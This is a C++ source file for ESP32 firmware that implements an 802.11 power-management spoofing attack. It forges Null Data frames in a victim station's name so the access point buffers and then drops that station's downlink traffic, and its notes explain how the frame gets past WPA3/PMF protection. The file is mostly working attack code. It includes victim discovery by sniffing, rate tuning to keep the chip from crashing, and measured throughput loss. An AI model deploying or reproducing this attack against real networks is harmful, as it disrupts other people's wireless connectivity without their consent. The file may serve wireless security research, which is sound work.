// 802.11 power-management (PS bit) spoofing.
//
// Design notes (why it is shaped this way):
//   * The Power Management bit is bit 12 of the Frame Control field, i.e. 0x10 in
//     its second octet. A station sets it in a Null Data frame to say "I am going
//     to sleep, buffer my downlink"; the AP then stops delivering to that station
//     and marks it in the TIM. Forging that frame with the victim's transmitter
//     address puts the AP's idea of the station's power state under our control --
//     the real station never notices, because nothing is sent to it.
//   * Null Data (data subtype 4) is the right frame for this: it carries no payload
//     and no LLC, so it needs neither the PMK nor a sequence-number context. QoS
//     Null is not used: a non-QoS frame keeps the PM bit exactly where the standard
//     puts it, with no second place (the QoS control field) to argue about.
//   * Why this survives 802.11w: PMF protects (robust) management frames. The PM bit
//     of a data frame is outside that set, so a PMF-required WPA3 BSS -- where a
//     forged deauth or BTM is dropped by the client's driver -- still acts on this
//     frame. That is the whole point of the module: a data-plane effect PMF does not
//     cover.
//   * Every sixth Null Data goes out with PM=0 instead of PM=1. PM=0 tells the AP
//     "I am awake, send what you have": it releases the buffered frames towards a
//     station that is not there, which is what turns "delayed" into "lost". A steady
//     PM=1 only delays.
//   * What it cannot do: the AP ages buffered frames out and drops them after the
//     retry limit, and every real uplink frame from the victim carries PM=0 and puts
//     the AP back into "awake". The forged state is therefore fought over and the
//     effect is partial -- measured -24% downlink throughput against an active
//     station, no disconnection (测试报告 §4.4.9). Honest boundary, in code.
//   * Pacing: Null Data is unicast (the AP acknowledges it), so every frame goes
//     through tx_guard. 10 frames/s, not the 20 the management-frame modules use:
//     at 20 frames/s the 32-buffer short-frame pool was exhausted after ~170..400
//     frames and the chip restarted (FATAL 0x101). At 10 frames/s a 60 s soak per
//     mode ran without a single refusal.
//   * The PS-Poll half of this idea was implemented and then removed: with a unicast
//     receiver address the MAC never transmits control subtype 10 (0/10 frames on the
//     air, while the identical 16-byte frame with a broadcast RA is captured 10/10
//     with Duration/ID = 0xC000|AID intact). Without a unicast poll there is nothing
//     to aim at an AP. Evidence and the probe command (CTRLTEST) are in 附录 A of
//     attack-principles.md and 测试报告 §4.4.9.
//
// A word on what we can and cannot see from here: `pspdl` counts downlink data
// frames towards a known victim on the air. If the forged PM state took, the AP
// stops transmitting to that station and the counter stops moving -- that is the
// attacker-side evidence. Everything else (buffer contents, drop reasons) is inside
// the AP.

#include "pspoll.h"

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <string.h>

#include "deauth.h"
#include "tx_guard.h"

namespace {

const uint8_t kSeqHigh = 0xF0;
const uint8_t kSeqLow = 0xFF;

// See the header: 10 frames/s, because 20 restarts the chip on this frame type.
const uint32_t kSendMs = 100;
const int kMaxClients = 8;
// Every kFlushEvery-th Null Data goes out with PM=0 (see the header comment).
const uint32_t kFlushEvery = 6;

pspoll_mode_t s_mode = PSPOLL_MODE_OFF;
uint8_t s_bssid[6];
uint8_t s_channel;
int32_t s_chan_err;
uint32_t s_last_tx_ms;
int s_cursor;
uint32_t s_null_tick;

uint32_t s_frames;
uint32_t s_null_frames;
uint32_t s_flush_frames;
uint32_t s_dl_frames;
uint32_t s_rx_polls;
uint32_t s_rx_nulls;
uint32_t s_rx_pm1;

struct client_t {
    uint8_t mac[6];
    uint32_t sent;
};

client_t s_clients[kMaxClients];
int s_client_count;

int find_client(const uint8_t* mac) {
    for (int i = 0; i < s_client_count; i++) {
        if (memcmp(s_clients[i].mac, mac, 6) == 0) {
            return i;
        }
    }
    return -1;
}

bool is_group(const uint8_t* mac) {
    return (mac[0] & 0x01) != 0;
}

int note_client(const uint8_t* mac) {
    if (mac == nullptr || is_group(mac) || memcmp(mac, s_bssid, 6) == 0) {
        return -1;
    }
    const int found = find_client(mac);
    if (found >= 0) {
        return found;
    }
    if (s_client_count >= kMaxClients) {
        return -1;
    }
    memset(&s_clients[s_client_count], 0, sizeof(client_t));
    memcpy(s_clients[s_client_count].mac, mac, 6);
    return s_client_count++;
}

// Null Data (data subtype 4) from the victim to the AP: FC byte 1 = ToDS | PM.
size_t build_null_data(uint8_t* frame, const uint8_t sta[6], bool pm) {
    memset(frame, 0, 24);
    frame[0] = 0x48;                                 // data / Null, no payload
    frame[1] = (uint8_t)(0x01 | (pm ? 0x10 : 0x00));  // ToDS + Power Management
    memcpy(frame + 4, s_bssid, 6);   // Addr1 = RA = the AP
    memcpy(frame + 10, sta, 6);      // Addr2 = TA = the victim we impersonate
    memcpy(frame + 16, s_bssid, 6);  // Addr3 = DA = the AP
    frame[22] = kSeqHigh;
    frame[23] = kSeqLow;
    return 24;
}

}  // namespace

bool pspoll_start(int index) {
    const uint8_t* bssid = WiFi.BSSID(index);
    if (bssid == nullptr) {
        return false;
    }
    memcpy(s_bssid, bssid, 6);
    s_channel = WiFi.channel(index);
    s_mode = PSPOLL_MODE_PM;
    s_last_tx_ms = 0;
    s_cursor = 0;
    s_null_tick = 0;
    s_frames = 0;
    s_null_frames = 0;
    s_flush_frames = 0;
    s_dl_frames = 0;
    s_rx_polls = 0;
    s_rx_nulls = 0;
    s_rx_pm1 = 0;
    s_client_count = 0;

    // A station that is still finishing a scan refuses the channel change, and a
    // refused change means the frames go out on whatever channel the scan stopped
    // on -- silently attacking the wrong network. The verdict is therefore reported
    // by the CLI instead of being dropped on the floor.
    s_chan_err = (int32_t)esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
    // Victims come from the sniffer, and so does `pspdl`.
    attack_sniffer_enable();
    return true;
}

void pspoll_stop(void) {
    s_mode = PSPOLL_MODE_OFF;
}

void pspoll_add_station(const uint8_t mac[6]) {
    note_client(mac);
}

void pspoll_release(void) {
    for (int i = 0; i < s_client_count; i++) {
        uint8_t frame[24];
        const size_t len = build_null_data(frame, s_clients[i].mac, false);
        // The unicast governor may still be pacing the last attack frame; retry
        // instead of silently dropping the undo (measured: the first attempt right
        // after a flood is refused, which made PSPOLLREL a no-op).
        for (int attempt = 0; attempt < 8; attempt++) {
            if (tx_guard_send(frame, (uint16_t)len) == ESP_OK) {
                s_frames++;
                s_null_frames++;
                s_flush_frames++;
                s_clients[i].sent++;
                break;
            }
            delay(25);
        }
    }
    s_mode = PSPOLL_MODE_OFF;
}

void pspoll_step(void) {
    if (s_mode == PSPOLL_MODE_OFF || s_client_count == 0) {
        return;
    }
    const uint32_t now = millis();
    if (s_last_tx_ms != 0 && now - s_last_tx_ms < kSendMs) {
        return;
    }
    // One frame per victim per tick, round-robin: the injection budget belongs to
    // the radio, not to each station.
    const int slot = s_cursor % s_client_count;
    client_t* c = &s_clients[slot];
    s_last_tx_ms = now;

    s_null_tick++;
    const bool pm = (s_null_tick % kFlushEvery) != 0;
    uint8_t frame[24];
    const size_t len = build_null_data(frame, c->mac, pm);
    if (tx_guard_send(frame, (uint16_t)len) == ESP_OK) {
        s_frames++;
        s_null_frames++;
        c->sent++;
        if (!pm) {
            s_flush_frames++;
        }
        s_cursor++;
    }
}

void pspoll_on_rx(const uint8_t* frame, uint16_t len, uint8_t type, uint8_t subtype) {
    if (s_mode == PSPOLL_MODE_OFF || len < 16) {
        return;
    }
    const uint8_t* dest = frame + 4;
    const uint8_t* src = frame + 10;

    // PS-Poll from a real station: counted only. It is the reference behaviour for
    // "the victim really power-saves", and an ESP-IDF station in modem sleep never
    // sends one because it wakes per DTIM instead.
    if (type == 1 && subtype == 10 && len >= 20) {
        if (memcmp(dest, s_bssid, 6) == 0) {
            s_rx_polls++;
        }
        return;
    }

    if (type != 0 && type != 2) {
        return;
    }

    // Association / Reassociation Response of the target BSS: the station that just
    // joined is the obvious victim.
    if (type == 0 && (subtype == 1 || subtype == 3) && len >= 30 &&
        memcmp(src, s_bssid, 6) == 0) {
        note_client(dest);
        return;
    }

    if (type == 2) {
        // A downlink data frame towards one of our victims: the AP is still
        // transmitting to it, i.e. our forged PM state did not take (or did not
        // hold -- the victim's own PM=0 frames reset it).
        if (find_client(dest) >= 0) {
            s_dl_frames++;
        }
        // Uplink data of the BSS: that station is awake and talking, so it is a
        // victim worth putting to sleep -- and the only way to learn a MAC when the
        // association happened before the sniffer was listening.
        if (memcmp(dest, s_bssid, 6) == 0 || memcmp(frame + 16, s_bssid, 6) == 0) {
            note_client(src);
        }
        // Null Data / QoS Null from a station: its own PM transitions.
        if ((subtype == 4 || subtype == 12) && find_client(src) >= 0) {
            s_rx_nulls++;
            if ((frame[1] & 0x10) != 0) {
                s_rx_pm1++;
            }
        }
        return;
    }

    // Any other management traffic of the BSS mentioning the victim: remember the
    // MAC, so a station that has not associated yet is still a candidate.
    if (memcmp(dest, s_bssid, 6) == 0 || memcmp(frame + 16, s_bssid, 6) == 0) {
        note_client(src);
    }
}

void pspoll_selftest(void) {
    static const uint8_t placeholder[6] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x55};
    static const uint8_t fake_sta[6] = {0x02, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE};
    if (s_bssid[0] == 0 && s_bssid[1] == 0 && s_bssid[2] == 0) {
        memcpy(s_bssid, placeholder, 6);
    }

    uint8_t frame[24];
    const size_t asleep = build_null_data(frame, fake_sta, true);
    Serial.printf("PSPOLLTEST sleep len=%u fc=0x%02X%02X pm=%u tods=%u ra=%02X:%02X:%02X"
                  " ta=%02X:%02X:%02X\n",
                  (unsigned)asleep, (unsigned)frame[1], (unsigned)frame[0],
                  (unsigned)((frame[1] & 0x10) != 0), (unsigned)(frame[1] & 0x01),
                  (unsigned)frame[4], (unsigned)frame[5], (unsigned)frame[6],
                  (unsigned)frame[10], (unsigned)frame[11], (unsigned)frame[12]);
    Serial.print("PSPOLLTEST sleep hex=");
    for (size_t i = 0; i < asleep; i++) {
        Serial.printf("%02X", frame[i]);
    }
    Serial.println();

    const size_t awake = build_null_data(frame, fake_sta, false);
    Serial.printf("PSPOLLTEST awake len=%u fc=0x%02X%02X pm=%u\n", (unsigned)awake,
                  (unsigned)frame[1], (unsigned)frame[0],
                  (unsigned)((frame[1] & 0x10) != 0));
    Serial.print("PSPOLLTEST awake hex=");
    for (size_t i = 0; i < awake; i++) {
        Serial.printf("%02X", frame[i]);
    }
    Serial.println();
}

bool pspoll_active(void) {
    return s_mode != PSPOLL_MODE_OFF;
}

const char* pspoll_mode_name(void) {
    return s_mode == PSPOLL_MODE_PM ? "pm" : "off";
}

uint32_t pspoll_frames(void) {
    return s_frames;
}

uint32_t pspoll_null_frames(void) {
    return s_null_frames;
}

uint32_t pspoll_flush_frames(void) {
    return s_flush_frames;
}

uint32_t pspoll_clients(void) {
    return (uint32_t)s_client_count;
}

uint32_t pspoll_dl_frames(void) {
    return s_dl_frames;
}

uint32_t pspoll_rx_polls(void) {
    return s_rx_polls;
}

uint32_t pspoll_rx_nulls(void) {
    return s_rx_nulls;
}

uint32_t pspoll_rx_pm1(void) {
    return s_rx_pm1;
}

int32_t pspoll_channel_err(void) {
    return s_chan_err;
}
